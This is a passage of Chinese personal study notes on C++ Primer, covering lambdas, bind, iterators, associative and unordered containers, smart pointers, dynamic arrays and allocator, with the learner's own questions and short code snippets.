执行期间不会失效，或者值发生未预期的改变；因此，捕获一般应该尽量避免使用指针或者引用，而应多使用值拷贝；（但貌似值拷贝会消耗更的性能） lambda 也支持隐式捕获变量（即自动推断捕获哪些变量），此时捕获列表使用 &#x3D; 来表示参数采用值传递([&#x3D;])，&amp; 来表示引用传递([&amp;])；如果要混合使用，则应该很小心，另外一个参数需要使用不同类型的传递方式，以便能够推断剩下的元素是哪种方式，显式为值，则隐式为引用。反之亦然； 举个栗子：w &#x3D; find_if(words.begin(), words.end(), [&#x3D;](const string &amp;s) {return s.size() &gt;&#x3D; sz; }); 此处 sz 是需要隐式捕获的变量；而且要求使用值传递； lambda 一般不会改变传入的形参，如果要改变形参时，应该在形参列表右侧使用 mutable 关键字，示例 auto f &#x3D; [ v1 ] ( ) mutable { …… }; &#x2F;&#x2F; 此处 mutable 表示函数体内会修改 v1; 由于此处是值传递，不会影响外层的 v1 变量值；（貌似改变形参也不是一个好习惯啊，正常最好是不要改变） 如果 lambda 不仅是一条 return 语句，还有其他语句，则编译器会认为 lambda 的返回类型为 void；除非我们显式的使用尾置返回类型进行说明 示例 [ ](int i) -&gt; int { …… }; &#x2F;&#x2F; 当没有显式指定返回类型时，是否默认返回类型为 void？还是说如果只有一条 return，会自动判断返回类型？ transform(s1.begin(), s1.end(), s2.begin(), predictate) 其中的 s2.begin 是指转换结果存放的目标位置； 如果 lambda 的捕获列表为空，正常可以使用函数来替换它，因为不需要使用到局部变量；但如果捕获列表非空，则不好使用函数替代 lambda； 后来发现可以使用 bind 避开这个限制；bind 很有点 python 中的装饰器的味道； 由于算法对谓词的参数数量的限制，导致 lambda 更多适合于一些简单的场景，对于需要多个参数的复杂逻辑函数，通过引入 bind 来解决 bind 用法，假设原目标函数 func 的参数数量是5个，例如 func(a, b, c, d, e) ，其中前两个参数的实参由于调用者提供，则需要包装成新的只接受这两个实参的可调用对象； bind 会返回一个新的可调用对象 gunc，对于算法来说，实际上是跟这个新的可调用对象打交道，如果算法只接受一元谓词，则这个新可调用对象只能有一个形参；如果算法支持二元谓词，则这个新可调用对象，只能有两个形参；形参由算法提供实参进行初始化，然后接下来调用旧的 func，然后按照点位符提前指定好的顺序，将算法提供的实参，与原来已有实参，按顺序排好，传入 func 进行计算 感觉 lambda 的捕获列表也可以多参数，只是 lambda 可能不太适合放过于复杂的计算逻辑在里面，而且也不太方便于复用； bind 接收的参数个数取决于被绑定函数，假设被绑定函数的参数个数为n，则 bind 函数的参数个数为 n + 1；因为被绑定函数占用了第一个参数的位置； auto check6 &#x3D; bind(check_size, _1, 6)； _1 表示一个占位符，将外层 gunc 的实参按顺序进行编号，并替换相应位置上面的占位符； placeholder 占位符是定义在 std::placeholder 命名空间中的，使用的时候，需要 using 声明，不然就得写完整的作用域名称出来了 例如：using std::placeholders::_1; &#x2F;&#x2F; 这种写法导致每个占位符都得声明一次，如果占位符数量比较多，写出来比较繁琐； 简单的写法：using namespace std::placeholders; 事实上，由于已经使用占位符的编号来映射实参，所以我们甚至也可以随意的改变实参想要放置的位置 例如：auto g &#x3D; bind(f, a, b, _2, c, _1); 再探迭代器 定义在 中的其他几种迭代器： 插入迭代器：用来向容器中插入元素； 流迭代器：用来遍历所关联的流； 反向迭代器：反方向移动的迭代器；（forward_list 不支持，因为它只能单方向移动） 移动迭代器：专门用来移动元素的迭代器； 插入迭代器 三种类型 back_inserter，对应 push_back(t) front_inserter，对应 push_front(t) list lst1 &#x3D; {1, 2, 3, 4}; list lst2, lst3; copy(lst1.cbegin(), lst1.cend(), front_inserter(lst2)) &#x2F;&#x2F; 结果得到 {4, 3, 2, 1} copy(lst1.cbegin(), lst1.cend(), inserter(lst3, lst3.begin()) &#x2F;&#x2F; 结果得到 {１, 2, 3, 4} inserter，对应 insert(t, p)，p 为一个指向原容器的迭代器，指定在 p 前面插入 t；示例 it &#x3D; inserter(c, iter) 得到一个指向 iter 的插入器 it，如果对它进行赋值，例如 *it &#x3D; val，会在 iter 前面插入相应的值 val，效果等同下面的代码： iter&#x3D; c.insert(iter, val); ++iter ; unique_copy，接受三个迭代器，将指定范围中不重复的元素，拷贝到第三个迭代器指定的位置中；(由于是写操作，应注意第三个迭代器对应的容器大小足够，如果无法确定，则第三个迭代器应该使用插入迭代器）； iostream 流迭代器 创建流迭代器时，需要指定读取的对象类型，且对象支持输入&#x2F;输出运算符 &lt;&lt; 和 &gt;&gt; 的操作，例如 istream_iterator int_it(cin); 如果不使用 cin 初始化，而使用默认初始化，例如 istream_iterator int_eof, 则会创建一个尾后值迭代器（什么鬼？有什么用？相当于 v.end()，可以用来作读取结束的判断 while(int_it !&#x3D; int_eof） 用法二：vector int_v(int_it, int_eof); &#x2F;&#x2F; 用来做范围初始化还挺方便的； 用法三：accumulate(int_it, int_eof, 0); &#x2F;&#x2F; 可以使用迭代算法对流进行操作，此时流看起来跟容器好像区别不大了； 文件流迭代器 ifstream infile(“..&#x2F;filename”); istream_iterator str_it(infile); &#x2F;&#x2F; 可以用来从”filename” 中读取字符串； 当将一个流迭代器绑定到一个流时，并不能保证立即读取数据，因此，从某种意义上来说，流迭代器貌似支持惰性求值（不过使用惰性求值也不见得是好事） ostream_iterator 允许绑定一个输出流，但它不能默认初始化，也不支持尾后值迭代器，它可选第二个参数，表示每次输出一个对象时，会将第二个参数也一并输出在后面，该参数必须是一个C风格字符串（即字符串字面值或者以空字符结尾的字符数组） ostream_iterator out(os) ostream_iterator out(os, d) out &#x3D; val &#x2F;&#x2F; 将 val 输出到 os 中； copy(v.begin, v.end, out) 实现了输出 v 容器中元素的功能，写法比循环更加简洁； 反向迭代器 c.rbegin, c.rend, c.crbegin, c.crend; reverse_iterator 有个 base 方法，可以将自己变成正向迭代器 反向迭代器表示的闭合范围与正向迭代器是相反的，因此，当使用正向迭代器初始化一个反向迭代器时，二者指向的并不是相同的元素； 泛型算法结构 形参模式 alg(beg, end, other_args) alg(beg, end, dest, other_args) alg(beg, end, beg2, other_args) alg(beg, end, beg2, end2, other_args) 命名规范 如果形参数量不同，则接受一个谓词参数 如果形参数量相同，则使用 _if 版本； 如果要额外拷贝，使用 _copy 版本 少数有 copy + if 结合的版本； 特定容器算法 链表由于可以在任意位置插入和重新连接元素的特点，应该优先使用其成员函数，而非通用版本的算法，原因：前者效率更高； 成员函数 lst.merge(lst2) &#x2F;&#x2F; 使用 &#x3D;&#x3D; 运算符 lst.merge(lst2, comp) &#x2F;&#x2F; 使用自定义谓词 lst.remove(val) &#x2F;&#x2F; 删除 &#x3D;&#x3D; val 的元素 lst.remove_if(pred) &#x2F;&#x2F; 删除满足 pred 条件的元素； lst.reverse() &#x2F;&#x2F; 反转 lst.sort() &#x2F;&#x2F; 使用 &lt; 运算符排序 lst.sort(comp) &#x2F;&#x2F; 使用谓词条件排序 lst.unique() &#x2F;&#x2F; 使用 &#x3D;&#x3D; 删除重复元素 lst.unique(pred) &#x2F;&#x2F; 使用谓词条件删除重复元素； splice 成员可以用来粘接两段 list 双向链接 list lst.splice(p, lst2) lst.splice(p, lst2, p2) lst.splice(p, lst2, b, e) 单向链表 forward_list flst.splice_after(p, lst2) flst.splice_after(p, lst2, p2) flst.splice_after(p, lst2, b, e) 链表的特点是会改变其参数（比如销毁），这点和通用算法不同，需要特别注意； 关联容器 使用关联容器 关联容器中，无序集合的名字都使用 unordered 开头，例如 unordered_map, unordered_set, unordered_multimap, unordered_multiset； 关联容器概述 map 支持列表初始化，但每个元素需要使用花括号将其包起来，示例 map&lt;string, int\\&gt; m = &#123;&#123;\"a\", 10&#125;, &#123;\"b\": 20&#125;&#125; set 和 multiset 都支持迭代器范围初始化，格式为 set iset(begin, end);，区别在于前者会剔除重复的元素，后者则不会； 对于 map&#x2F;set 来说，相同的组成元素是 key 部分，key 称为关键字，它的类型是有一定要求的，即要支持 &lt; 运算符，否则就要注明使用自定义函数进行比较运算 示例: set&lt;Sales_data, decltype(compareIsbn)*&gt; bookStore(compareIsbn) &#x2F;&#x2F; 此处不是很理解为什么要在 bookStore 后面再写上 compareIsbn？用来做为构造函数的参数，初始化对象；莫非此种格式即查自定义类型关联容器的写法？ 等同于下面的声明法 using less &#x3D; bool(*)(Sales_data &amp;a, Sales_data &amp;b); multiset&lt;Sales_data, less&gt; bookStore2(less); 相比较之下，看来还是 decltype 比较好用；如果不使用 decltype，就需要使用 using 来自定义类型名称了；假设要声明一个函数指针的类型，可以这样 using less &#x3D; boo(*)( ); pair 的操作，定义在 的头文件中 pair&lt;T1, T2&gt; p; pair&lt;T1, T2&gt; p &#x3D; {v1, v2}; &#x2F;&#x2F; 支持列表初始化 pair&lt;T1, T2&gt; p(v1, v2); &#x2F;&#x2F; 支持调用符初始化； auto p &#x3D; make_pair(v1, v2); p.first p.second p1 &#x3D;&#x3D; p2, p1 !&#x3D; p2; p1 relop p2 &#x2F;&#x2F; 注：此处的 relop 表示 relationship operation，即关系运算符 &lt;, &lt;&#x3D;, &gt;, &gt;&#x3D;等； 关联容器操作 关联容器迭代器 关联容器除了顺序容器的那些类型外，还有一些自己的类型，包括 key_type，关键字类型 mapped_type，map 中与关键字匹配的对象类型，即 key-value 键值对中的 value 对象；set 没有此类型； value_type，元素类型，对于 map 是 pair；对于 set 则与 key_type 相同； 可以通过作用域运算符来提取这些成员，例如 map&lt;string, int&gt;::value_type 没想到关联容器也是有迭代器的，因为可以通过 begin&#x2F;end 来对关联容器进行遍历，map 成员是字典序的； 对于 map 来说，通过迭代器可以顺序访问里面的 pair 元素成员，其中 pair 的 key 成员是 const 只读不可修改的，而 value 则可以修改； 对于 set 来说，其成员是不可修改的，只能通过迭代器进行访问； 由于关联容器成员的特殊性（例如 set 成员不可修改，map 元素是 pair 且 pair 的首个成员不可修改），因此写操作系列的泛型算法都无法用于关联容器； 由于关联容器不能通过关键字快速查找，因此普通的搜索泛型算法也不适用于关联容器，调用关联容器自己的 find 成员函数的性能更好； 在实际编程中，关联容器只在两种情况下参与泛型算法，一种是被当作源序列进行读取操作，另外一种是当作目的位置进行添加成员； 迭代器解引用的两种方法 (*it).second &#x3D; val; it-&gt;second &#x3D; val; multiset 或 set 不能使用 back_inserter，因为它没有 push_back 的方法； 添加元素 set 支持 begin&#x2F;end 和列表两种添加方式，它会自动剔除重复的元素； set2.insert(v.begin(), v.end()); set2.insert({1, 2, 3, 4}) 向 map 添加元素有四种方法，分别是列表，make_pair，pair，map&lt;T1, T2&gt;::value_type；最后一种即显式的声明成员元素； 关联容器的 insert 操作 c.insert(v), c.emplace(args) &#x2F;&#x2F; 返回一个 pair 对象，包含指向对应关键字的迭代器 + 成功与否的 bool 值（true 表示插入成功，false 表示插入失败）； 对于接受重复 key 的 multiset&#x2F;multimap 来说，只返回迭代器，没有 bool 值； c.insert(p, v), c.emplace(p, args) &#x2F;&#x2F; 返回一个迭代器，指向对应的关键字；其中的 p 用来指示从哪里开始搜索新元素的存储位置，感觉这个有点奇怪，因为如果不遍历全部位置，如何避免重复？ c.insert(b, e)，c.insert(il) &#x2F;&#x2F; 返回 void，b&#x2F;e 是 c::value_type 类型的迭代器，il 是这种类型的列表；对于 map&#x2F;set，只插入原来不存在的元素，对于 multiset&#x2F;multimap 则会插入所有元素； multimap 如何访问具有相同名称的 key? 用 lower_bound 和 upper_bound 获得范围后来访问；或者使用 equal_range; map[key] &#x3D; value 与 map.insert({key, value}) 一开始以为它们的效果一样，后来发现二者有所不同；当同一个键出现多次添加时，第一种写法会保留最后一次的结果，相当于重新赋值；第二种写法会保留最早的结果，相当于添加前会先检查键是否存在，如果已经存在，则不会再次添加； 删除元素 三种操作 c.erase(k) &#x2F;&#x2F; 删除所有关键字为 k 的元素，返回被删除元素的数量； c.erase(p) &#x2F;&#x2F; 删除迭代器 p 指向的元素，返回指向下一个位置的迭代器，p 不能为 end；若 p 是最后一个元素，则返回 end; c.erase(b, e) &#x2F;&#x2F; 删除 b&#x2F;e 范围中的元素，返回 e； map 的下标操作 只有 map 和 unordered_map 支持下标操作，其他类型的关联容器（multimap, set, multiset）都不支持； 下标操作方式 c[k] &#x2F;&#x2F; 注：如果在 c 中没有找到 k，则会插入一个 k 的键，并进行值的初始化，因此这种方式只适合用于访问非 const 的 map； 怎样实现值初始化？估计跟值本身的类型有关； 返回什么东西？据说是返回了 mapped_type 对象，是一个左值； c.at[k] &#x2F;&#x2F; 如果 k 不在容器中，会抛出一个异常，不会自动添加一个元素； 对于 map 的迭代器，解引用会获得元素的类型，即 pair；而下标操作会得到 mapped_type 类型，即键值对中的值对象类型，而且返回的是左值，意味着可以对它进行读和写； 访问元素 操作方式 c.find(k) &#x2F;&#x2F; 返回第一个指向 k 的迭代器，若找不到，返回 end； 对于 map，还有一种访问方法为 m[key]，如果 key 不在 map 中，会自动添加这个 key；不过这种访问方式竟然也叫做下标操作； c.count(k) &#x2F;&#x2F; 返回键等于 k 的元素数量；对于不允许重复的容器，返回要么 0 要么 1； c.lower_bound(k) &#x2F;&#x2F; 返回第一个指向关键字不小于 k 的迭代器 c.upper_bound(k) &#x2F;&#x2F; 返回第一个指向关键字大于 k 的迭代器 c.equal_range(k) &#x2F;&#x2F; 返回关键字等于 k 的一对迭代器 pair；如果 k 没找到，则 pair 的两个成员都是 end； 可以通过 find（获得迭代器）和 count 进行配合来遍历 multiset 或 multimap； 也可以使用 upper_bound 和 lower_bound 配合来完成（当二者返回相同的迭代器时，表示键没有找到）；后者的用法比前者更加直观； 最直观便捷的方法是使用 equal_range，返回相等的键的首尾迭代器； 无序容器 据说有4种无序容器，但书上只提到了 unordered_set, unordered_map，还有另外两个不知是什么； 后来发现是 unordered_multiset, unordered_multimap； 实现原理：哈希函数+桶；（如果关联容器的关键字不需要固定顺序的话，理论上使用无序容器会得到更好的性能，也更为简单） 无序容器的操作与有序容器的操作是一样的，正常它们之间可以相互替代，但无序容器也有一些自己的特有操作（主要跟桶有关） c.bucket_count() &#x2F;&#x2F; 查询容器当前的桶数量 c.max_bucket_count() &#x2F;&#x2F; 查询容器能容纳的最多桶数量（好奇这个数字难道不是可以无限增长的吗？） c.bucket_size(n) &#x2F;&#x2F; 查询第 n 个桶中的有多少个元素； c.bucket(k) &#x2F;&#x2F; 查询关键字 k 在哪个桶中，返回桶的编号； local_iterator, const_local_iterator &#x2F;&#x2F; 查询桶中元素的迭代器类型 c.begin(n), c.end(n), c.cbegin(n), c.cend(n) &#x2F;&#x2F; 第 n 个桶的头尾迭代器 c.load_factor &#x2F;&#x2F; 查询每个桶的平均元素数量，返回的值为 float 类型； c.max_load_factor &#x2F;&#x2F; 查询容器允许每个桶存放的最多元素数量，返回值为 float 类型；当元素数量超过这个值时，容器一般会创建新的桶来安放； c.rehash(n) &#x2F;&#x2F; 重新组织桶，使得当前需要使用的桶数量大于等于 n，且大于所有元素总数&#x2F;每个桶的平均容量； c.resize(n) &#x2F;&#x2F; 重新组织桶，使得 c 能够容纳 n 个元素且不用 rehash ； 无序容器对关键字类型的要求 关键字的类型需要支持 &#x3D;&#x3D; 运算符，同时由于需要对关键字进行哈希运算，因此关键字的类型也需要满足哈希函数的要求；如果不自定义自己的哈希函数，则默认支持的类型包括内置类型、标准库 string 类型、智能指针类型等3种； 如果提供自定义的哈希函数和等号运算符(&#x3D;&#x3D;)重载函数，则可以使用自定义的关键字类型创建无序容器； size_t hasher(const Sales_data &amp;sd) { return hash() (sd.isbn()) }; &#x2F;&#x2F; 自定义哈希函数； bool eqOp(const Sales_data &amp;lhs, const Sales_data &amp;rhs) { return lhs.isbn() &#x3D;&#x3D; rhs.isbn() }; &#x2F;&#x2F; 等号运算符重载 using SD_multiset &#x3D; unordered_multiset&lt;Sales_data, decltype(hasher)*, decltype(eqOp)*&gt;; &#x2F;&#x2F; 创建自定义无序容器类型 SD_multiset bookStore(42, hasher, eqOp); &#x2F;&#x2F; 类对象实例化 动态内存 动态内存与智能指针 两种智能指针，但有三种类型，分别是 shared_ptr（多个指针指向同一个对象）, unique_ptr（一个对象只被一个指针关联）, week_ptr（指向 shared_ptr 关联的对象）； 智能指针支持的操作（智能指针定义在头文件 中； share&#x2F;unique 都支持的操作 shared_ptr sp &#x2F;&#x2F; 声明一个空的 shared_ptr，指向对象的类型为 T unique_ptr up &#x2F;&#x2F; 声明一个空的 unique_ptr，指向对象的类型为 T p &#x2F;&#x2F; 将 p 作为一个条件判断，若非指针则返回 true，若为指针则返回 false *p &#x2F;&#x2F; 解引用指针指向的对象； p-&gt;m &#x2F;&#x2F; 相当于 (*p).m p.get( ) &#x2F;&#x2F; 获取 p 存储的指针（返回结果为普通的内置指针类型，而非智能指针类型，注：若智能指针释放了对象，则该指针也跟着失效了） swap(p, q), p.swap(q) &#x2F;&#x2F; 交换 p, q 中存储的指针 仅 share_ptr 支持的操作 make_shared(args) &#x2F;&#x2F; 返回一个 shared_ptr，指向 args 创建的类型为 T 的对象；示例： auto p1 &#x3D; make_shared(42); auto p2 &#x3D; make_shared(10, ‘9’) auto p3 &#x3D; make_shared(); &#x2F;&#x2F; 初始化对象的值为 0 shared_ptr p(q) &#x2F;&#x2F; 使用 q 来初始化一个 p，q 的计数器会增加1，p 和 q 必须都是 shared_ptr 类型，而且 q 指向的对象类型需要能够转化为 T*； p &#x3D; q &#x2F;&#x2F; 用 q 给 p 赋值，p 和 q 必须都是 shared_ptr 类型，它们指向的对象类型能够相互转换；有意思的是，此举会递增 q 的引用计数，并递减 p 的引用计数，如果 p 原来的引用计数为 1，递减后变为 0，则 p 原指向的内存会被释放；假设 p 的引用次数原来为 3 呢？这个时候变成了 2，原内存不会释放，但指向了新对象，接下来要如何确保新对象的内存会被释放？猜测 p 在判断完原对象是否需要释放后，新对象的引用计数应该是重新从1开始了； 新对象的引用计数没有重新开始，而是貌似共享与 q 相同的引用计数，猜测这个引用计数应该是一个 static 变量； p.unique() &#x2F;&#x2F; 返回一个布尔值，如果 p.use_count 为 1，表示是唯一的，返回 true；否则返回 false； p.use_count() &#x2F;&#x2F; 返回与 p 共享对象的智能指针数量；据说要计算很久，仅用于调试 好奇如果 p.use_count( ) 要很久，那么意味着 p.unique( ) 也要很久，因为 p.unique 好像会调用 p.use_count？ 正常情况下，当某个 shared_ptr 局部变量离开了它的作用域后，编译器会检查它的 use_count 是否递减为 0，如果是的话，会自动回收它指向的对象；但有一种情况，即 shared_ptr 被存放在某个容器中，而容器一直在用，但实际上里面的 shared_ptr 可能已经不再需要了，此时 shared_ptr 指向的对象会一直存在，直到容器被销毁为止；此种情况的副作用就是会有一些内存被持续无效占用，一个比较好的习惯是使用容器的 erase 方法删除那些已经不再需要的元素； 使用动态内存的一个常见原因是为了在多个对象之间共享数据（在第12章最后一节的文本查找程序，非常完整的展示了这种用法场景） 直接管理内存 使用 new 动态分配和初始化对象 如果没有显式的初始化，则对于内置类型来说，默认初始化的值是未定义的；对于类类型来说，默认初始值依赖于其构造函数； int *pi &#x3D; new int; &#x2F;&#x2F; 对于内置类型，此种隐式的默认初始化方式的值，是未定义的；但如果使用 int() 的效果则不同了； 显式初始化的方法很多，可以列表初始化，圆括号初始化，值初始化（空括号）等； vector *pv &#x3D; new vector{1, 2, 3}; int *pi &#x3D; new int(42); string *ps &#x3D; new string(10, “hi”); int *pi2 &#x3D; new int(); &#x2F;&#x2F; 空括号的值初始化，值为0； 括号内只有单一初始器的时候，才可以使用 auto 来自动推断类型，示例 auto p1 &#x3D; new auto(obj) &#x2F;&#x2F; 正确 auto p2 &#x3D; new auto{a, b, c} &#x2F;&#x2F; 错误，因为括号内非单一的初始化器； new 支持分配 const 对象，示例: const int *pi &#x3D; new const int(1024); 当内存耗尽，无法分配内存时，new 会抛出 bad_alloc 的错误；通过传递 nothrow 参数，可以避免抛出错误，同时分配一个空指针，示例：int *pi &#x3D; new (nothrow) int(1024); bad_alloc 和 nothrow 都定义在头文件 中； 在什么场景下需要用到 nothrow 这个参数呢？ 通过 delete 来释放内存，示例 delete pi; 相同的指针释放多次，或者释放非 new 创建的指针，都将产生未定义的行为； 非动态分配的内存，貌似有其他机制来回收，如果我们手工回收了，貌似后续的回收就会出错？ 这里面估计涉及到栈回收的机制，很好奇栈回收是如何实现的？ 传递给 delete 的指针必须指向动态分配的内存，或者是一个空指针； const 对象虽然不可被改变，但可以被销毁； 在函数的局部作用域中分配的动态内存，当离开作用域后，由于局部变量被销毁，会导致此块动态内存无法被释放，因此内存的释放需要在局部作用域内进行 想了下，这句话可能不完全对，如果函数将指针返回，则可以在函数外部销毁动态内存； 当一个指针指向的动态内存被 delete 显式释放以后，该指针会变成空悬指针，为避免误用空悬指针，在释放后，应该显式的将指针置为 nullptr，这样就可以避免误用发生错误 仅管如此，这种做法仍然无法避免指向同一块内存的其他指针发生问题，仅仅是对当前指针有效；其他共享同一内存地址的指针依然是空悬指针好像； shared_ptr 和 new 的结合使用 由于普通指针和智能指针不能隐式转换，因此不能用一个普通指针来给智能指针赋值，需要使用直接初始化的方法 shared_ptr p1 &#x3D; new int(1024) &#x2F;&#x2F; 错误做法 shared_ptr p1(new int(1024)) &#x2F;&#x2F; 正确做法 同理，也不可定义返回类型为智能指针的函数后，最后返回的却是普通指针，需要在函数 return 语句中显式的对它们进行转换，例如 return shared_ptr(new int(p)) 定义和改变 shared_ptr 的其他方法 shared_ptr p(q) &#x2F;&#x2F; p 管理 q 指向的对象，q 必须指向动态分配的内存，且 q 的类型能够转换为 T 类型；这个做法也意味着，p 接下来将接管原来 q 所指向的对象，当 p 的引用计数递减为 0 时，对象将被销毁，q 将变成空悬指针； shared_ptr p(u) &#x2F;&#x2F; 让 p 接管原来 unique_ptr 所指向的对象，并将 u 置空；&#x2F;&#x2F; 貌似实现了 unique_ptr 和 shared_ptr 之间的资源交接？ shared_ptr p(q, d) &#x2F;&#x2F; 此处的 d 是一个谓词（即函数），与第一条的区别在于这次使用 d 自定义操作来替代 delete 释放内存； shared_ptr p(p2, d) &#x2F;&#x2F; p 是 p2 的拷贝，二者的区别在于 p 使用 d 来替代 delete 怎么感觉跟上一条好像没有什么区别？ p.reset() &#x2F;&#x2F; 若 p 是唯一指向对象的 shared_ptr，则对象将被销毁并释放内存 p.reset(q) &#x2F;&#x2F; 令 p 指向 q p.reset(q, d) &#x2F;&#x2F; 令 p 指向 q，且使用 d 替代 delete 来释放内存； 使用一个内置指针来访问智能指针指向的对象是很危险的，因为我们无法预估什么时候对象已经被销毁了； get 方法可以获取智能指针存储的内置指针，它仅在一种情况下使用，即有些旧代码不能传递智能代码，只接受普通指针；而且，要确保指针传递后，不会被 delete，不然原来的智能指针就空悬了，而且还会发生二次 delete； 永远不要使用 get 获得的普通指针，去初始化另外一个智能指针；原因：同一块内存，被两个智能指针指向，它们必然发生二次 delete，最后产生未定义行为； p.unique 可以用来确定当前指针是否是唯一的用户，如果不是的，则可以为它重新赋值指向新对象，同时不会导致原有的对象被销毁； 智能指针和异常 普通的内置指针，在发生异常时，不会自动释放资源，需要显式的手动释放；因此，对于某些没有析构函数的类，我们可以借鉴智能指针+自定义构造函数的方式，来完成对资源的自动释放，示例如下： connection c &#x3D; connect(&amp;d); shared_ptr p(&amp;c, disconnect); 由于自定义了析构的函数，当 p 销毁时，它不会调用默认的 delete，而会使用初始化时传入的 disconnect 函数，来对资源进行释放； 注意此处的 disconnect 函数在定义的时候，需要以智能指针为参数，如果不是的话，需要另外定义，包裹原来的 disconnect 函数； 智能指针应避开的陷阱 避免使用同一个内置普通指针，初始化或 reset 多个智能指针； 不 delete get 返回的指针（原因：对象由智能指针管理，不用由返回的普通指针操心，否则很容易造成重复释放资源） 避免使用 get 结果初始化或 reset 另外一个智能指针（感觉同第一条）； 当使用 get 的返回指针时，牢记它随时有可能失效； 如果智能指针管理的资源，不是使用 new 动态分配的内存，记住在初始化的时候，传递一个专用的删除器，用来释放资源； unique_ptr 指针 unique_ptr 的初始化只能使用直接初始化的方式 unique_ptr 的操作 unique_ptr u1 &#x2F;&#x2F; 空指针，指向 T 类型的对象； unique_ptr&lt;T, D&gt; u2 &#x2F;&#x2F; 同上，区别在于使用 D 类型的函数来释放内存 unique_ptr&lt;T, D&gt; u3(d) &#x2F;&#x2F; 同上，区别在于显式指定了 D 类型的函数 d； u &#x3D; nullptr &#x2F;&#x2F; 释放 u 指向的对象，置为空； u.release() &#x2F;&#x2F; 置空 u，但同时会返回内部保存的普通指针；注意，对象没有被销毁，因此，接下来如果没有使用另外一个智能指针接替管理对象，对象将会进入手动管理的状态，需要显式的 delete 来释放，以避免内存泄露； u.reset() &#x2F;&#x2F; 释放并置空，u 原来的关联对象会被销毁 u.reset(q) &#x2F;&#x2F; 将 u 改为指向 q 的关联对象，u 原来的关联对象会被销毁 u.reset(nullptr) &#x2F;&#x2F; 释放并置空，u 原来的关联对象会被销毁，跟 u.reset() 有什么区别？ 由于 unique_ptr 与对象唯一绑定，因此它是不能被拷贝或者赋值的，只能被释放或者 reset；只有一种例外情况，即它在局部作用域结束之前被 return； unique_ptr 的删除器也是可以被重载的，格式跟 shared_ptr 也相同，示例： unique_ptr&lt;objT, delT&gt; up(new objT, fcn) &#x2F;&#x2F; 注：其中 fcn 是 delT 类型的函数对象； weak_ptr 指针 weak_ptr 与 shared_ptr 指向同一个对象，区别在于 weak_ptr 不会管理对象的生命周期，也不会影响 shared_ptr 的引用次数（据说这种行为叫做弱共享），shared_ptr 销毁对象的时候，是不会顾虑是否存在 weak_ptr 指向这个对象；销毁后，会导致 weak_ptr 变成了空悬指针； weak_ptr 的使用场景是什么？ weak_ptr 的操作方法 weak_ptr wp; &#x2F;&#x2F; 声明一个空的 weak_ptr weak_ptr wp(sp) &#x2F;&#x2F; 使用一个 shared_ptr 来初始化 weak_ptr，它们指向共同的对象，其中 sp 的类型需要能够转换成 T 类型； w &#x3D; p; &#x2F;&#x2F; p 可以是一个 shared_ptr，也可以是一个 weak_ptr，赋值后它们共享对象； w.reset(); &#x2F;&#x2F; 将 w 置为空； w.use_count(); &#x2F;&#x2F; 查询与 w 共享对象的 shared_ptr 的数量 w.expired() &#x2F;&#x2F; 若 w.use_count 为0，则返回 true，否则返回 false；貌似 true 意味着指针已经好像无效了，或者被置空了； w.lock() &#x2F;&#x2F; 若 w.expired 为 true，则返回一个空 shared_ptr，否则返回一个指向共享对象的非空 shared_ptr； 由于 weak_ptr 指向的对象不受其控制，随时有可能被销毁，因此使用之前进行检查变成是必要的（若如此，为何不直接使用 shared_ptr？） 关于动态内存和智能指针（或者指针）的使用，今天有了一个新的理解；当变量在函数体内初始化时，它被放在了栈内存中，当栈的生命周期结束时，变量的内存也会被回收；但动态内存改变了这一局面，它让变量变成了自由人，不再受到栈的控制，它被存储到了堆上面；当我们仍然在函数体内定义智能指针类型的变量，去管理分配在堆上的这块内存； 事实上，当使用智能指针时，变量被存储在哪里，对使用者来说，变得没有什么区别；但是，由于栈本身的空间有限，当变量本身的数据很大时，存储到堆上变成是必须的了； 智能指针可以是函数体内的某个变量，其实也可以是函数体内某个对象的某个数据成员，它可以很灵活的出现在各种地方； 另外，当这些数据需要给不同的对象进行共享时，通过动态内存存放在堆中，貌似也是必须的；不然会局限于某个对象的作用域； 那为什么不使用 static 变量呢？它也可以实现变量生存在局部作用域外？答：虽然 static 变量离开局部作用域后仍然活着，但对它的访问，貌似只能通过局部作用域进行，还不够自由； 动态数组 可以用来批量给对象分配动态内存；动态数组并不是数组类型，只是一种叫法； int *pia &#x3D; new int[42] &#x2F;&#x2F; 使用中括号来表示分配的数量 typedef int arrT[42]; &#x2F;&#x2F; 感觉使用 using arrT &#x3D; int[42] 看起来更直观一些； int *p &#x3D; new arrT; &#x2F;&#x2F; 分配一个可容纳42个 int 元素的内存空间； 可以在中括号后面[ ] 加上一对圆括号或者花括号，来进行值初始化或列表初始化； int *p &#x3D; new arrT{1, 2, 3, 4}; 如果列表元素数量小于数组大小，余下的元素会做值初始化；如果多了，则会报错； 批量销毁动态数组中的元素 delete [ ] p &#x2F;&#x2F; 与常规做法的区别在于，中间多了对空的中括号；如果忽略了中括号，会发生未定义的行为； 这点昨天在测试 CUDA 用法有看到，当时还觉得这个写法很奇怪，原来是出自这里；不过 CUDA 使用了 cudaFree 函数进行封装，感觉封装后更加直观容易理解了； 可以使用 unique_ptr 来管理动态数组，这样确保能够自动释放资源 unique_ptr&lt;int[]&gt; up(new int[10]); &#x2F;&#x2F; 注意这里使用了 new int[10]，而不是 new int； 由于 up 绑定的是一个数组，因此不能使用点运算符了，也不能使用箭头运算符，但倒是可以使用下标运算符，例如 up[2] 来访问相应的元素； shared_ptr 不支持管理动态数组，除非自定义删除器； shared_ptr&lt;int[]&gt; sp(new int[10], [](int *p){ delete [ ] p; }); &#x2F;&#x2F; 用 lambda 定义的删除器作为第二个参数； sp.reset(); &#x2F;&#x2F; 由于 sp 是一个智能指针，所以需要使用 reset 方法，还释放它指向的内存；它会自动调用之前定义的 lambda 方法； 但 shared_ptr 不支持下标运算符和算术运算符，所以就算成功声明了管理数组的 shared_ptr，貌似也不太好用；使用的时候，还需要用 get 获取内置指针来处理，绕了一个大圈子； 但是刚又测试了一下，发现可以使用下标运算符，好奇怪； allocator 类 目的：为了实现内存分配与对象构造的分离，使得内存管理更加灵活，而使用 new 时，这两个动作是连在一起的，可能会造成内存使用不允分的浪费，另外对于没有默认构造函数的类也无法使用 new；allocator 定义在头文件 中； allocator 是一个模板类型，它分配的内存是原始的，未构造的； 支持的操作 allocator a，定义一个 allocator 对象 a，它可以用来为 T 类型对象分配所需的内存空间； a.allocate(n)，分配存储 n 个 T 对象所需的内存空间，这段内存空间是原始的，未构造的； a.deallocate(p, n)，从指针 p 的位置开始，释放之后 n 个 T 类型对象所占的内存空间 p 必须是之前调用 allocate 返回的指针，它指向整段分配内存的起始位置； 在调用 deallocate 之前，需要先对这 n 个对象执行销毁的动作； n 